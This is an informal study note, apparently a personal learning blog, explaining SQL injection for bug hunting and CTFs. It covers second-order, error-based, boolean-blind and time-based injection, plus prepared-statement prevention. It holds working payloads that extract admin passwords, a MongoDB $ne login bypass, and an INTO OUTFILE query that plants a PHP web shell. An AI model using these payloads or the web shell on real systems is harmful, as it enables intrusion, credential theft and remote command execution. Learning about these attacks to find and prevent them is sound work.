Whoah, I was really looking forward to this subject, cause as far as I know those should be easy. But whenever I find those in CTFs they're very hard to retrieve any information from without using SQLMap. I actually blame my lack of understanding subject for it.

SQL Injection - it is vulnerability that is found when attacker can use any SQL command in data base of application. It happens when input data isn't sanitized or modified or they're improperly escaped. It can lead to bypassing authorization, leaks of user DATA, interference in data tables or even sometimes [[RCE]].

Amount of SQL injections is getting lower due to Frameworks having mechanisms that are protecting themselves from them. Yet they're still present. Probably last 3 to 4 years in which they can be found // sadly :( 

NoSQL databases have different queries but rules remain the same

### **Mechanisms**
I assume you know some basic SQL.

SQL Injection works by entering another querry with our normal request.
For example:
```
POST /change_password
Host: example.com

new_password='password12345'
```
The actual sql query would look something like:
```
UPDATE Users
SET Password='password12345'
Where Id = 2;
```
So we have access to the SET query and we could possibly try something like this:
```
POST /change_password
Host: example.com

new_password="password12345';--"
```
Our SQL query now becomes:
```
UPDATE Users
SET Password=;password12345';-- WHERE id = 2
```
We effectively commented out WHERE clause so we actually updated every single users password to "password12345"

### **Using second-order SQL injection**
**First-order SQL injection** is when webapp actually uses user input directly on the sql queries. They're very rare nowadays.

**Second-order SQL injection** is when user data is stored in database and then downloaded and used insecurely in SQL requests. Even when applications properly handle data after collecting it from user those exploits can appear when applications incorrectly treats data as safe, when theyre downloaded from database

For example:
Lets imagine scenario where we have webapp that lets their users create accounts by inputting username and password. We're trying to do second-order SQL injection by using following request
```
POST /signup
Host: example.com

username="vickie' UNION SELECT Username, Password FROM Users;--"&password=password123
```
Now the server ingests our username as a whole as it should, instead of treating it like a query. It uses escape technique so that we can't do first-order SQL Injection.

Now threat actor tries to collect his email via this http request:
```
GET /emails
Host: example.com
```
If user won't add his username and key the application will try to get username from browser and will use it to complete SQL request:
```
SELECT Title, Body FROM Emails
WHERE Username='username'
```
So it becomes:
```
SELECT Title, Body FROM Emails
WHERE Username='vickie'
UNION SELECT Username, Password FROM Users;--
```
It will cause server to return all users and password and their emails.

### **To prevent SQL Injections...**
Because SQL Injections are critical vulnerability, every application should be protected from them. One way of doing so is to use **prepared statement** also known as **parametrized query**, which practically make it impossible for hacker to do SQL injection.

Normally without doing said preventive measures user provided data is parsed on the very base of SQL query even before parsing, compilation and optimalization. 
But when we implement prepared statement user provided data is added to already existing instruction so user provided values will become just values instead of being part of queries. It makes it possible for database to differ between code and user provided data.

To prevent SQL injection you could also try to justt whitelist and blacklist some Strings, so that user can't try to manipulate query. It is kind of bad practice though, because whitelists and blacklists are have to be prepared very carefully and we all know how IT proceeds with anything. Many blacklists and whitelists are easy to be bypassed. So just prepared statement.

### **Lets hunt SQL injections**
First method is to look for inputs and then insert normal data plus additional ' sign ("'"). Single " or as we call it in Poland "ciapek" should create some anomalies or at least provide us with an error when application is prune to SQL injection. But it doesn't have to.

Another way of finding is classical fuzzing. Which is done by sending specially designed payloads of SQL injection and monitoring server response.

You should try to look for classical SQL injection. They're easy to find. 

Sometimes you can look for **error based SQL injection**. Server will send us information that something that we have done is basically forbidden. For example:
CONVERT((SELECT Password FROM Users WHERE Username="Admin"), DATE);--
`` Conversion failed when trying to convert "dao1piyog912badg3" to data type "date"

You should also look out for **blind SQL injection**. When there is no feedback received we can use two types of SQL injection payloads:
**Time Delay SQL Injection** and **Boolean Exploitation SQL Injection**. 

**Boolean Exploitation SQL Injection** would work when based on true or false respond server shows ourselves something back. Based on that we can try to guess every data in all tables. 

For example imagine that premium user have banner with diamonds on their user page. It tells if user is premium by collecting cookie which contains user id and then looking for him in table of premium users.  GET request which contains that cookie could look something like this:
```
GET / 
Host: example.com
Cookie: user_id=2
```

```
SELECT * FROM PremiumUsers WHERE Id ='2';
```

If the request gets response with data we're working with premium user and we get diamond banner back. Now if our account is premium we can try to make additional logic that can provide us additional information:
```
2' UNION SELECT Id FROM Users 
Where Username = 'admin'
and SUBSTR(Password, 1, 1) = 'a';--
```
If server returns true that means that admin password starts with an a. 

**Time Based or Time Delay SQL Injection** is similar but it  depends on time-based cue instead of visual-cue. If the Boolean SQL Injection doesn't return visual cue we have to be depended on time- based cue. We actually make a request that times us out for some seconds if the query returns true. 

Basically:
```
2' UNION SELECT
IF(SUBSTR(Password, 1, 1) = 'a', SLEEP(10), 0)
Password FROM Users 
Where Username = 'admin'
```
If we guess correctly first letter of admins password the query will sleep for 10 seconds before returning.

### **Exfiltrate Data by using SQL Injection**
Sometimes SQL Injection can be completely blind, but it will do real damage. For example it can use provided data on backend operations, so we don't have response if it worked or not. In this case we should force data base to save information in some place on the server. For example following query 
```
SELECT Password FROM Users WHERE Username='admin'
INTO OUTFILE '/var/www/html/output.txt'
```
It is default catalogue for internet webpages for wide variety of linux servers. Then we can gain access to this file by going to https://example.com/output.txt.

For example webpage collects active users, by collecting data from your cookie and tracking it. Then we can manipulate request so that it contains output to file. Thanks to that we can confirm that SQL Injection is a working vulnerability in this functionality even though there is no visual cue or even time based cue for us.

### **NoSQL injection***
In NoSQL databases there are still injections.  You can search them up, I don't want to actually put that down right now, because they're very much depended on the database and it's language. Logic stays the same.

MongoDB example:
``Users.find({username: 'vickie', password 'password123'})
into
``Users.find({username: 'admin', password: {$ne:""}});
MongoDB uses $ne to select objects which value doesn't equal to provided value. So it will make as login as an administrator provided that admin doesn't have empty password.

To find places vulnerable you should input special chars like: (', ") (;) (\) (()) ([]) ({})  and look for anomalies or weird behaviors.

You can automate this process by using https://github.com/codingo/NoSQLMap

### **Escalation**
Basically try to get as much information as possible. You can try to get more intel on the database structure or on single entities that it contains. 

Sometimes if it uses php you can get access to the webapp shell, by using SQL ability to output its output as a file.
```
SELECT Password FROM Users Wher Username='abc'
UNION SELECT "<? system($_REQUEST['cmd']); ?>"
INTO OUTFILE "/var/www/html/shell.php"
```
If you can inject something like that into SQL query you  can then access php shell of server on the webapp:
http://www.example.com/shell.php?cmd=Command

### **Automation of SQL Injection**
Trying to exploit SQL Injection manually is a fucking chore and isn't scalable.
It is advised to use tool provided by Kali which is called sqlmap. It uses same techniques as written above, but guesses entire database on its own and then prints it.
**"sqlmap http://sqlmap.org"**
also you can integrate sqlmap with your burp suite proxy by using SQLiPy for Burp. It can help. 


